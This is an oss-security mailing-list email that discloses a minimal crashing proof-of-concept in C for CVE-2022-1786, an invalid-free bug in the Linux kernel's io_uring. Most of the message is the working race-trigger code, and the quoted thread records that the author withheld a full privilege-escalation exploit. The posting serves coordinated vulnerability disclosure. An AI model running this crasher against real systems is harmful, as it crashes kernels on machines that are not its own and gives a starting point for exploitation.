Received: (qmail 9471 invoked by uid 550); 28 May 2022 10:18:42 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30397 invoked from network); 28 May 2022 08:27:16 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=6qRI5jKLifcXY2TOXYsIBTQ1MfoA0xsWf7ao4qQJG9E=;
        b=EPsGHGDuVyou70NnNZqtYt3PZrUyLNMdLfw3b2kGZwAI57L+rVoxb53t8wXkEPCbwX
         1zucpRP44a30a4TNiWgrb61WBg+kdGZ8paYVSerJqrgReLw6W/QyNrTqqDCvAmuewoQs
         xdAK9S5DXH3jdytrm4Vn7/YJIjtoaX0vXjZrmB59UtKH10upZEgexvqAuu+cGi6xNxBb
         IWxUFZYeGUT37q6WyXvu8tkxv4awF/1Z0zO5MPGYE0FMJjcIzHY2K58fxk3dcPcOyhV3
         yenwkSL6kWzEmZxB0ujS7Z/mrxoJFjNovUkzseQqZkwahbpxG3acrwk38z+3Vw994Oil
         1FcQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=6qRI5jKLifcXY2TOXYsIBTQ1MfoA0xsWf7ao4qQJG9E=;
        b=46+7nFo3gcIsC7PaEKv5p7oAxVOij/FphmxHEatqfGxYimpup7ZWc3crHcWdn1irFp
         FxTR9NBc1/wAnBNHyB9IhsR+vF4OAKjoXDmhELp1Xvrb2GI4xftVcKPf2jiCqzj1kiRf
         /UMwJm0ZTjth2Xx/SifjTd/2jelkPuD7/zlPguXrqDubgaH/buCqgsPZT7OWgxKrOz3R
         SwVv0WOJ2YApS8CmSXQrlvn3QYc1agItwT5i3BvVjNfQFmNGmd7Jgy9gRvznNVNAcXZw
         ce1jJh9qm9c72iZMhijHm4yL3r+CVQPIwYRnm+JLjyVTt9PmQdXvMkWDf8BtYa4o+cRs
         X39w==
X-Gm-Message-State: AOAM530fFkG9Pl8vWzwQ/0Y3WnyGbWK1y0ncEwfTKBh1aLqiBrOL8yPK
	27PDbEYBoOgvpYkFddvIlbY0lot7fZiyNFiexqnNR6raod98CQ==
X-Google-Smtp-Source: ABdhPJw7QA17sp0xgyC2ntVR62vpe5+ZZ+G+4VtQgotOY+0lOFZaBioxk7sNkmvnzZ+WL8VGyk+Hh1ayWDu6NvL6AmA=
X-Received: by 2002:a17:90b:4f81:b0:1e0:7643:36ae with SMTP id
 qe1-20020a17090b4f8100b001e0764336aemr12277132pjb.124.1653726424002; Sat, 28
 May 2022 01:27:04 -0700 (PDT)
MIME-Version: 1.0
References: <CADW8OBs7P=YE_xfYCX3KuhaiVkwjSTMVUjLX93S_bn_XBd05EQ@mail.gmail.com>
 <20220524162210.GA31294@openwall.com> <CADW8OBuPkS==FV+0zb9rObxoc+02GCBno+7SdDXpnYOvGLik0g@mail.gmail.com>
In-Reply-To: <CADW8OBuPkS==FV+0zb9rObxoc+02GCBno+7SdDXpnYOvGLik0g@mail.gmail.com>
From: Kyle Zeng <zengyhkyle@gmail.com>
Date: Sat, 28 May 2022 01:26:27 -0700
Message-ID: <CADW8OBtXoQ6drexdLGkRj-7UhjzxTfxH-qVxd1GPFHND64oh_g@mail.gmail.com>
To: Solar Designer <solar@openwall.com>
Cc: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: Re: [oss-security] CVE-2022-1786: Linux Kernel invalid-free in io_uring

Hi all,

A minimal crashing PoC for CVE-2022-1786 is attached in the email.

Kyle

=-=-=-=-=-=-=-=
#define _GNU_SOURCE

#include <stdarg.h>
#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <sys/xattr.h>

#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/io_uring.h>

// io_uring tutorial:
#define u64 unsigned long long
#define u32 unsigned int

# ifndef __NR_io_uring_setup
#  define __NR_io_uring_setup 425
# endif
# ifndef __NR_io_uring_enter
#  define __NR_io_uring_enter 426
# endif
# ifndef __NR_io_uring_register
#  define __NR_io_uring_register 427
# endif

int fd_io_uring;
#define GROOM_NUM 0x20
u64 cpu_num = 4;
u64 work_num = 0x200;
char fname[] = "/etc/passwd";
u64 heap_addr;
int target_shmid;
char timerfd_backup[0x100];
#define NAP_TIME1 50000
#define NAP_TIME2 50000

void set_cpu(int cpuid)
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpuid, &my_set);
    assert(sched_setaffinity(0, sizeof(my_set), &my_set) == 0);
}

void increase_limit()
{
    int ret;
    struct rlimit open_file_limit;

    /* Query current soft/hard value */
    ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);

printf("[*] file limit: %d\n", open_file_limit.rlim_max);

    /* Set soft limit to hard limit */
    open_file_limit.rlim_cur = open_file_limit.rlim_max;
    ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);
}

struct cq_ring_t {
    u32 *head;
    u32 *tail;
    u32 *ring_mask;
    u32 *ring_entries;
    struct io_uring_cqe *cqes;
};

struct sq_ring_t {
    u32 *head;
    u32 *tail;
    u32 *ring_mask;
    u32 *ring_entries;
    u32 *flags;
    u32 *array;
};

struct uring_mgr_t {
    int fd;
    struct sq_ring_t sq_ring;
    struct cq_ring_t cq_ring;
    struct io_uring_sqe *sqes;
};

#define IORING_OP_WRITE 23
#define IORING_OP_READ 22

struct uring_mgr_t mgr;
void uring_mgr_setup(struct uring_mgr_t *mgr, u32 entries)
{
    // create io_uring fd
    struct io_uring_params setup_params = {0};
    setup_params.flags = IORING_SETUP_IOPOLL;
    mgr->fd = syscall(__NR_io_uring_setup, entries, &setup_params);
    assert(mgr->fd >= 0);

    // map the ring buffer and the SQE(submission queue entry) buffer
    uint32_t sq_ring_sz = setup_params.sq_off.array +
setup_params.sq_entries * sizeof(uint32_t);
    uint32_t cq_ring_sz = setup_params.cq_off.cqes +
setup_params.cq_entries * sizeof(struct io_uring_cqe);
    uint32_t ring_sz = sq_ring_sz > cq_ring_sz ? sq_ring_sz : cq_ring_sz;
    uint32_t sqes_sz = setup_params.sq_entries * sizeof(struct
io_uring_sqe);
    void *ring_ptr = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED
| MAP_POPULATE,
mgr->fd, IORING_OFF_SQ_RING);
mgr->sqes = (struct io_uring_sqe *) mmap(NULL, sqes_sz, PROT_READ |
PROT_WRITE,
MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQES);
    assert((long)mgr->sqes >= 0);

    // now initialize the completion queue
    struct cq_ring_t *cq_ring = &mgr->cq_ring;
    cq_ring->head = (u32 *)((long )ring_ptr + setup_params.cq_off.head);
    cq_ring->tail = (u32 *)((long)ring_ptr + setup_params.cq_off.tail);
    cq_ring->ring_mask = (u32 *)((long)ring_ptr +
setup_params.cq_off.ring_mask);
    cq_ring->ring_entries = (u32 *)((long)ring_ptr +
setup_params.cq_off.ring_entries);
    cq_ring->cqes = (struct io_uring_cqe *)((long)ring_ptr +
setup_params.cq_off.cqes);

    // now initialize the submission queue
    struct sq_ring_t *sq_ring = &mgr->sq_ring;
    sq_ring->head = (u32 *)((long)ring_ptr + setup_params.sq_off.head);
    sq_ring->tail = (u32 *)((long)ring_ptr + setup_params.sq_off.tail);
    sq_ring->ring_mask = (u32 *)((long)ring_ptr +
setup_params.sq_off.ring_mask);
    sq_ring->ring_entries = (u32 *)((long)ring_ptr +
setup_params.sq_off.ring_entries);
    sq_ring->flags = (u32 *)((long)ring_ptr + setup_params.sq_off.flags);
    sq_ring->array = (u32 *)((long)ring_ptr + setup_params.sq_off.array);
}

int *flag;
u64 val;
u64 *val_ptr = &val;
u64 elapse_time[2];
void *func(void *arg) {
    int cpuid = (int)(long)arg;
    set_cpu(cpuid);
    while(*flag == 0);
    int ret = syscall(__NR_io_uring_enter, fd_io_uring, work_num/2,
work_num/2, 1);
    __atomic_fetch_add(&val, 1, __ATOMIC_SEQ_CST);
}


void trigger_free()
{
    uring_mgr_setup(&mgr, work_num);
    fd_io_uring = mgr.fd;
printf("fd_io_uring: %d\n", fd_io_uring);

    // open some file
    // fd = open("/etc/passwd", O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
    int fds[work_num];
puts(fname);
    for(int i=0; i<work_num; i++) {
        fds[i] = open(fname, O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
        assert(fds[i] >= 0);
    }
    printf("fd: %d\n", fds[0]);
    assert(fds[0] >= 0);

// SQE: submission queue entries
    // struct io_uring_sqe sqe = {
    //  .opcode = IORING_OP_WRITE,
    //  .flags = 0,
    //  .ioprio = 0,
    //  .fd = fd,
    //  .off = 0,
    //  .addr = 0,
    //  .len = 1,
    // };
    void *buf = mmap(NULL, 0x5000000, PROT_READ|PROT_WRITE,
MAP_ANON|MAP_PRIVATE, -1, 0);
    memset(buf, 'A', 0x5000000);

    struct io_uring_sqe sqe = {
        .opcode = IORING_OP_READ,
        .flags = 0,
        .ioprio = 0,
        .fd = -1,
        .off = 0,
        .addr = (u64)buf,
        .len = 0x5000000,
    };

    // now submit the request
    struct sq_ring_t *sq_ring = &mgr.sq_ring;
    struct cq_ring_t *cq_ring = &mgr.cq_ring;
    u32 index, tail, next_tail;
    next_tail = tail = *sq_ring->tail;
    next_tail++;
    // barrier();
    // copy the request to the sqe buffer
    index = tail & *mgr.sq_ring.ring_mask;
    for(int i=0; i<work_num; i++) {
        sqe.fd = fds[i];
        memcpy(&mgr.sqes[index+i], &sqe, sizeof(struct io_uring_sqe));
    }

    sq_ring->array[index] = index;
    tail = next_tail;
    assert(*sq_ring->tail != tail);
    *sq_ring->tail = work_num;

    set_cpu(2);

    pthread_t tids[2];
    int ret;
    for(int i=0; i<2; i++) {
        ret = pthread_create(&tids[i], NULL, func, i);
        assert(ret == 0);
    }
    *flag = 1;
    // sleep(1);
    while(*val_ptr != 2);
    pthread_join(tids[0], NULL);
    pthread_join(tids[1], NULL);

    // sleep(1000);
    execve("/", NULL, NULL);
    close(fd_io_uring);
    exit(0);
}

void attempt()
{
flag = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0);
if(!fork()) {
trigger_free();
} else {
wait(NULL);
for(int i=0; i<0x100; i++) timerfd_create(CLOCK_REALTIME, 0);
}
}


int main() {

puts("========================================================================");

increase_limit();

set_cpu(0);

for(int i=0; i<10000; i++) {
printf("i: %d\n", i);
usleep(10000);
if(!fork()) attempt();
else {
wait(NULL);
}
}
puts("Done");
}
=-=-=-=-=-=-=-=

On Tue, May 24, 2022 at 9:28 AM Kyle Zeng <zengyhkyle@gmail.com> wrote:
>
> A small correction, I shared a minimal crashing PoC to linux-distros
> but not the LPE exploit.
> I do not plan to share the LPE exploit because of ethical issues.
>
> To answer your question: I intend to post the crashing PoC on May
> 27th. Thanks for reminding me.
>
> Kyle
>
> On Tue, May 24, 2022 at 9:22 AM Solar Designer <solar@openwall.com> wrote:
> >
> > On Tue, May 24, 2022 at 09:10:37AM -0700, Kyle Zeng wrote:
> > > # Impact
> > > I wrote a proof-of-concept exploit and demonstrated that it can be
> > > used to achieve local privilege escalation.
> >
> > Since you shared the PoC exploit with linux-distros, you're supposed to
> > also post that to oss-security within 7 days of your first posting
> > above, so by or on May 31.  Do you intend to, and when exactly?
> >
> > Alexander
